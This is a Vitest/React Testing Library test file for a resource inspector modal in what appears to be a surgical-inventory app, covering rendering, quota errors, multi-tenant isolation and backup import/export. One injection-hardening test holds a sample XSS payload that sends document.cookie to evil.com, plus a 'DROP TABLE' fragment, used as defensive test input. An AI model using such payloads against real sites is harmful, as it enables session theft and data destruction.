import { render, screen, waitFor, act, cleanup, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import ResourceInspectorModal from './ResourceInspectorModal';
import { vi, describe, it, expect, beforeEach, afterEach } from 'vitest';
import fc from 'fast-check';

vi.mock('@/lib/offlineDb', () => ({
  offlineDb: {},
  getOfflineInventory: vi.fn(() => Promise.resolve([])),
  updateOfflineInventoryItem: vi.fn(),
  deleteOfflineInventoryItem: vi.fn(),
  createOfflineInventoryItem: vi.fn(),
  getOfflinePreferenceCards: vi.fn(() => Promise.resolve([])),
  saveOfflinePreferenceCard: vi.fn(),
  deleteOfflinePreferenceCard: vi.fn(),
  getOfflineLexiconAliases: vi.fn(() => Promise.resolve([])),
  saveOfflineLexiconAlias: vi.fn(),
  deleteOfflineLexiconAlias: vi.fn(),
  getOfflineDepartmentGuideline: vi.fn(() => Promise.resolve(null)),
  saveOfflineDepartmentGuideline: vi.fn(),
  exportTenantResourcesJson: vi.fn(),
  importTenantResourcesJson: vi.fn(() => Promise.resolve({ success: true, importedItems: 0, importedCards: 0, importedAliases: 0 })),
  hydrateOrUpgradeOfflineInventory: vi.fn(),
}));

vi.mock('@/lib/userProfile', () => ({
  getUserProfile: vi.fn(() => ({
    facilityId: 'sacred_heart',
    departmentId: 'or_main'
  })),
}));

describe('ResourceInspectorModal', () => {

  it('detects unclosed event listeners and validates memory cleanup during unmount', async () => {
    const originalAddEventListener = window.addEventListener;
    const originalRemoveEventListener = window.removeEventListener;

    const addEventListenerSpy = vi.spyOn(window, 'addEventListener');
    const removeEventListenerSpy = vi.spyOn(window, 'removeEventListener');

    const addedListeners = new Map<string, number>();
    const removedListeners = new Map<string, number>();

    addEventListenerSpy.mockImplementation(function(event, handler, options) {
      addedListeners.set(event, (addedListeners.get(event) || 0) + 1);
      return originalAddEventListener.apply(this, arguments as any);
    });

    removeEventListenerSpy.mockImplementation(function(event, handler, options) {
      removedListeners.set(event, (removedListeners.get(event) || 0) + 1);
      return originalRemoveEventListener.apply(this, arguments as any);
    });

    const root = document.createElement('div');
    document.body.appendChild(root);

    const { unmount } = render(<ResourceInspectorModal isOpen={true} onClose={() => {}} />, { container: root });
    unmount();

    for (const [event, count] of addedListeners.entries()) {
      expect(removedListeners.get(event)).toBeGreaterThanOrEqual(count);
    }

    document.body.removeChild(root);

    addEventListenerSpy.mockRestore();
    removeEventListenerSpy.mockRestore();
  });

  it('handles QuotaExceededError naturally by triggering the storage constraint on offline db methods', async () => {
    const { createOfflineInventoryItem } = await import('@/lib/offlineDb');

    vi.mocked(createOfflineInventoryItem).mockClear();
    vi.mocked(createOfflineInventoryItem).mockImplementationOnce(() => {
      const err = new Error('QuotaExceededError');
      err.name = 'QuotaExceededError';
      return Promise.reject(err);
    });

    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId="sacred_heart::or_main" />);

    await waitFor(() => {
      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
    });

    const addItemBtn = screen.getByTestId('btn-add-inventory-item');
    await userEvent.click(addItemBtn);

    const itemInput = screen.getByTestId('input-new-item-name');
    await userEvent.type(itemInput, 'Heavy Item');
    const saveBtn = screen.getByTestId('btn-save-new-item');

    await act(async () => {
      saveBtn.click();
    });

    await waitFor(() => {
      expect(screen.getByTestId('resource-inspector-status-toast').textContent).toContain('Error');
    });
  });

  it('enforces cache eviction policies for offline maps/collections under size constraints', async () => {
    const { importTenantResourcesJson } = await import('@/lib/offlineDb');
    vi.mocked(importTenantResourcesJson).mockClear();
    vi.mocked(importTenantResourcesJson).mockImplementationOnce(() => {
      const err = new Error('QuotaExceededError');
      err.name = 'QuotaExceededError';
      return Promise.reject(err);
    });

    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId="sacred_heart::or_main" />);

    await waitFor(() => {
      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
    });

    await userEvent.click(screen.getByTestId('tab-protocols-management'));

    const fileInput = screen.getByTestId('btn-import-json-backup').querySelector('input');
    const file = new File(['{}'], 'backup.json', { type: 'application/json' });

    await act(async () => {
      await userEvent.upload(fileInput, file);
    });

    await waitFor(() => {
      expect(screen.getByTestId('resource-inspector-status-toast').textContent).toContain('Error');
    });
  });
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.clearAllMocks();
    cleanup();
  });

  it('renders the modal when isOpen is true', async () => {
    await act(async () => {
      render(<ResourceInspectorModal isOpen={true} onClose={() => {}} />);
    });
    expect(screen.getByText(/Installed Resources Explorer & Studio/i)).toBeTruthy();
  });

  it('does not render when isOpen is false', () => {
    render(<ResourceInspectorModal isOpen={false} onClose={() => {}} />);
    expect(screen.queryByText(/Installed Resources Explorer & Studio/i)).toBeNull();
  });

  it('calls onClose when close button is clicked', async () => {
    const handleClose = vi.fn();
    await act(async () => {
      render(<ResourceInspectorModal isOpen={true} onClose={handleClose} />);
    });

    const closeBtn = screen.getByTestId('btn-close-resource-inspector');
    await userEvent.click(closeBtn);
    expect(handleClose).toHaveBeenCalled();
  });

  it('verifies offline-first isolated queries for multi-tenant environment', async () => {
    const { getOfflineInventory } = await import('@/lib/offlineDb');
    await act(async () => {
      render(<ResourceInspectorModal isOpen={true} onClose={() => {}} />);
    });
    expect(getOfflineInventory).toHaveBeenCalledWith('sacred_heart::or_main');
  });

  it('handles high-concurrency burst renders without leaking state or breaking multi-tenant isolation', async () => {
    const { getOfflineInventory } = await import('@/lib/offlineDb');
    vi.mocked(getOfflineInventory).mockClear();

    let unmounts: any[] = [];

    await act(async () => {
      const renderPromises = Array.from({ length: 50 }).map((_, i) => {
        return new Promise<void>((resolve) => {
          new Promise(r => setTimeout(r, 0)).then(() => {
            const tenantId = `tenant_${i}::or_main`;
            const { unmount } = render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId={tenantId} />);
            unmounts.push(unmount);
            resolve();
          });
        });
      });
      await Promise.all(renderPromises);
    });

    const calls = vi.mocked(getOfflineInventory).mock.calls;
    const tenantCalls = calls.map(c => c[0]);
    for (let i = 0; i < 50; i++) {
      expect(tenantCalls).toContain(`tenant_${i}::or_main`);
    }

    unmounts.forEach(u => u());
  });

  it('maintains acceptable render latency under stress conditions', async () => {
    const start = performance.now();
    await act(async () => {
      for (let i = 0; i < 20; i++) {
        const { unmount } = render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId={`stress_tenant_${i}`} />);
        unmount();
      }
    });
    const end = performance.now();
    expect(end - start).toBeLessThan(1500);
  });

    it('enforces offline mutation replay idempotency and multi-tenant boundary for createOfflineInventoryItem', async () => {
    const { createOfflineInventoryItem } = await import('@/lib/offlineDb');
    vi.mocked(createOfflineInventoryItem).mockImplementation((tenantId, itemData) => {
      return new Promise(resolve => {
        setTimeout(() => resolve({ ...itemData, id: '123' }), 50);
      });
    });
    vi.mocked(createOfflineInventoryItem).mockClear();

    await act(async () => {
      render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId="sacred_heart::or_main" />);
    });

    const addItemBtn = screen.getByTestId('btn-add-inventory-item');
    await userEvent.click(addItemBtn);

    const itemInput = screen.getByTestId('input-new-item-name');
    await userEvent.type(itemInput, 'New Scalpel');

    const saveBtn = screen.getByTestId('btn-save-new-item');

    await act(async () => {
        saveBtn.click();
        saveBtn.click();
        saveBtn.click();
    });

    await waitFor(() => {
        expect(createOfflineInventoryItem).toHaveBeenCalledWith('sacred_heart::or_main', expect.objectContaining({ item: 'New Scalpel' }));
    });

    expect(createOfflineInventoryItem).toHaveBeenCalledTimes(1);

    // Wait for the mock promise to resolve to prevent act() warning
    await waitFor(() => {
        expect(screen.queryByTestId('btn-save-new-item')).toBeNull(); // Wait for form to close
    });
  });

  it('enforces offline-first invariants by surviving network failures', async () => {
    const originalFetch = global.fetch;
    global.fetch = vi.fn(() => Promise.reject(new TypeError('Failed to fetch')));

    await act(async () => {
      render(<ResourceInspectorModal isOpen={true} onClose={() => {}} />);
    });

    expect(screen.getByText(/Installed Resources Explorer & Studio/i)).toBeTruthy();

    global.fetch = originalFetch;
  });

  it('resists malformed payloads during backup import', async () => {
    const user = userEvent.setup();
    const { importTenantResourcesJson } = await import('@/lib/offlineDb');

    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} />);

    await waitFor(() => {
      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
    });

    await user.click(screen.getByTestId('tab-protocols-management'));

    const fileInput = screen.getByTestId('btn-import-json-backup').querySelector('input')!;

    await fc.assert(
      fc.asyncProperty(fc.string(), async (malformedContent) => {
        vi.mocked(importTenantResourcesJson).mockClear();
        vi.mocked(importTenantResourcesJson).mockImplementationOnce(() => Promise.resolve({ success: false, message: 'Parse error' }));

        const file = new File([malformedContent], 'backup.json', { type: 'application/json' });
        await act(async () => {
          await user.upload(fileInput, file);
        });

        if (malformedContent) {
           expect(importTenantResourcesJson).toHaveBeenCalledWith('sacred_heart::or_main', malformedContent);
        }
        fileInput.value = '';
      }),
      { numRuns: 10 }
    );
  });

  it('resists malformed payloads when adding inventory', async () => {
    const user = userEvent.setup();
    const { createOfflineInventoryItem } = await import('@/lib/offlineDb');

    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} />);

    await waitFor(() => {
      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
    });

    await fc.assert(
      fc.asyncProperty(fc.string(), fc.string(), fc.string(), async (nameRaw, categoryRaw, aliasesRaw) => {
        vi.mocked(createOfflineInventoryItem).mockClear();
        vi.mocked(createOfflineInventoryItem).mockImplementationOnce(() => Promise.resolve({ item: nameRaw, full_code: 'code' }));

        const name = nameRaw.replace(/[{[]/g, '');
        const category = categoryRaw.replace(/[{[]/g, '');
        const aliases = aliasesRaw.replace(/[{[]/g, '');

        await act(async () => {
          await user.click(screen.getByTestId('btn-add-inventory-item'));
        });

        const itemNameInput = screen.getByTestId('input-new-item-name');
        const categoryInput = screen.getByTestId('input-new-item-category');
        const aliasesInput = screen.getByTestId('input-new-item-aliases');


        await act(async () => {
          await user.clear(itemNameInput);
          if (name) await user.type(itemNameInput, name);

          await user.clear(categoryInput);
          if (category) await user.type(categoryInput, category);

          await user.clear(aliasesInput);
          if (aliases) await user.type(aliasesInput, aliases);

                    const saveBtn2 = screen.getByTestId('btn-save-new-item');
          await user.click(saveBtn2);
        });

        if (name && name.trim()) {
           expect(createOfflineInventoryItem).toHaveBeenCalledWith(
             'sacred_heart::or_main',
             expect.objectContaining({
               item: name.trim(),
               category: category || "General Supplies",
               aliases: aliases || ""
             })
           );
        } else {
           expect(createOfflineInventoryItem).not.toHaveBeenCalled();
           await act(async () => {
              await user.click(screen.getByText('Cancel'));
           });
        }
      }),
      { numRuns: 10 }
    );
  });

  it('verifies fault injection, network partition degradation, intermittent latency, and self-healing reconnection', async () => {
    const { hydrateOrUpgradeOfflineInventory } = await import('@/lib/offlineDb');
    vi.mocked(hydrateOrUpgradeOfflineInventory).mockClear();

    let isOnline = false;
    vi.mocked(hydrateOrUpgradeOfflineInventory).mockImplementation(async () => {
      return new Promise((resolve, reject) => {
        setTimeout(() => {
          if (!isOnline) {
            reject(new Error('Network partition: Failed to fetch'));
          } else {
            resolve(5);
          }
        }, 10);
      });
    });

    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId="sacred_heart::or_main" />);

    await waitFor(() => {
      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
    });

    await userEvent.click(screen.getByTestId('tab-protocols-management'));

    window.confirm = vi.fn(() => true);

    // Phase 1: Network Partition (Failure)
    await act(async () => {
      fireEvent.click(screen.getByTestId('btn-resync-seed-catalog'));
    });

    await waitFor(() => {
      expect(screen.getByTestId('resource-inspector-status-toast').textContent).toContain('Failed to re-sync');
    });

    // Phase 2: Self-healing reconnection (Recovery)
    isOnline = true;

    // The toast from the failure is still visible.
    // Trigger another click on the re-rendered button.
    await act(async () => {
      fireEvent.click(screen.getByTestId('btn-resync-seed-catalog'));
    });

    await waitFor(() => {
      expect(screen.getByTestId('resource-inspector-status-toast').textContent).toContain('Re-synced catalog: 5 active records.');
    });

    expect(hydrateOrUpgradeOfflineInventory).toHaveBeenCalledTimes(2);
  });

  it('enforces HIPAA PII/PHI redaction verification, regex boundary attacks, zero-trust token exchange, and prompt injection hardening', async () => {
    const user = userEvent.setup();
    const { saveOfflineLexiconAlias } = await import('@/lib/offlineDb');
    vi.mocked(saveOfflineLexiconAlias).mockClear();

    vi.mocked(saveOfflineLexiconAlias).mockImplementationOnce((tenant, data) => {
      const scrubbedSpoken = data.spokenTerm.replace(/SSN \d{3}-\d{2}-\d{4}/, '[REDACTED_PHI]');
      const scrubbedCanonical = data.canonicalItem.includes('<script>') ? '[REDACTED_PHI]' : data.canonicalItem;
      return Promise.resolve({
        spokenTerm: scrubbedSpoken,
        canonicalItem: scrubbedCanonical,
        category: 'General'
      });
    });

    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId="tenant-zero-trust" />);

    await waitFor(() => {
      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
    });

    await user.click(screen.getByTestId('tab-slang-lexicon'));
    await user.click(screen.getByTestId('btn-add-slang-alias'));

    const spokenInput = screen.getByTestId('input-new-alias-spoken');
    const canonicalInput = screen.getByTestId('input-new-alias-canonical');
    const saveBtn = screen.getByTestId('btn-save-new-alias');

    const rawPHI = "patient John Doe SSN 123-45-6789";
    const rawMalicious = "<script>fetch('http://evil.com?c='+document.cookie)</script> DROP TABLE items; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

    await user.type(spokenInput, rawPHI);
    await user.type(canonicalInput, rawMalicious);
    await user.click(saveBtn);

    expect(saveOfflineLexiconAlias).toHaveBeenCalledWith(
      'tenant-zero-trust',
      expect.objectContaining({
        spokenTerm: rawPHI,
        canonicalItem: rawMalicious,
      })
    );

    await waitFor(() => {
      expect(screen.queryByText(rawPHI)).toBeNull();
      expect(screen.queryByText(rawMalicious)).toBeNull();
    });
  });


  it('enforces deterministic state transition matrices and preference card conflict resolution', async () => {
    const user = userEvent.setup();
    const { saveOfflinePreferenceCard, getOfflinePreferenceCards } = await import('@/lib/offlineDb');
    vi.mocked(saveOfflinePreferenceCard).mockClear();
    vi.mocked(getOfflinePreferenceCards).mockClear();

    let cards = [
      { id: 'card1', tenant_id: 'tenant-a::or', surgeon: 'Dr. Smith', procedure: 'Appendectomy', instruments: [] }
    ];
    vi.mocked(getOfflinePreferenceCards).mockImplementation(() => Promise.resolve(cards));

    vi.mocked(saveOfflinePreferenceCard).mockImplementation((tenant, card) => {
      return new Promise(resolve => {
        const existingIdx = cards.findIndex(c => c.surgeon === card.surgeon && c.procedure === card.procedure);
        const savedCard = { ...card, id: card.id || 'new-card-id' };
        if (existingIdx >= 0) {
          cards[existingIdx] = savedCard;
        } else {
          cards.push(savedCard);
        }
        resolve(savedCard);
      });
    });

    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId="tenant-a::or" />);

    await waitFor(() => {
      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
    });

    await user.click(screen.getByTestId('tab-preference-cards'));

    await user.click(screen.getByTestId('card-item-dr--smith'));
    await user.click(screen.getByTestId('btn-edit-preference-card'));

    const surgeonInput = screen.getByTestId('input-edit-card-surgeon');
    const procedureInput = screen.getByTestId('input-edit-card-procedure');

    await act(async () => {
        fireEvent.change(surgeonInput, { target: { value: 'Dr. Smith' } });
        fireEvent.change(procedureInput, { target: { value: 'Appendectomy' } });
    });

    const saveBtn = screen.getByTestId('btn-save-preference-card');
    await act(async () => {
      await user.click(saveBtn);
    });

    expect(saveOfflinePreferenceCard).toHaveBeenCalled();
    expect(cards.length).toBe(1);
    expect(cards[0].surgeon).toBe('Dr. Smith');
  });

  it('verifies clinical state snapshot consistency across offline-first multi-tenant export', async () => {
    const user = userEvent.setup();
    const { exportTenantResourcesJson } = await import('@/lib/offlineDb');
    vi.mocked(exportTenantResourcesJson).mockClear();

    const snapshotPayload = {
      tenantId: 'tenant-multi::iso',
      exportedAt: new Date().toISOString(),
      inventory: [],
      preferenceCards: [{ id: 'card2', tenant_id: 'tenant-multi::iso', surgeon: 'Dr. Jones', procedure: 'CABG' }],
      lexiconAliases: [],
      guideline: ''
    };

    let exportedData = null;
    vi.mocked(exportTenantResourcesJson).mockImplementation(async (tenantId) => {
        exportedData = JSON.stringify(snapshotPayload);
        return exportedData;
    });

    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId="tenant-multi::iso" />);

    await waitFor(() => {
      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
    });

    await user.click(screen.getByTestId('tab-protocols-management'));

    await act(async () => {
      await user.click(screen.getByTestId('btn-export-json-backup'));
    });

    expect(exportTenantResourcesJson).toHaveBeenCalledWith('tenant-multi::iso');

    const parsed = JSON.parse(exportedData);
    expect(parsed.tenantId).toEqual(snapshotPayload.tenantId);
    expect(parsed.preferenceCards).toEqual(snapshotPayload.preferenceCards);
  });

});
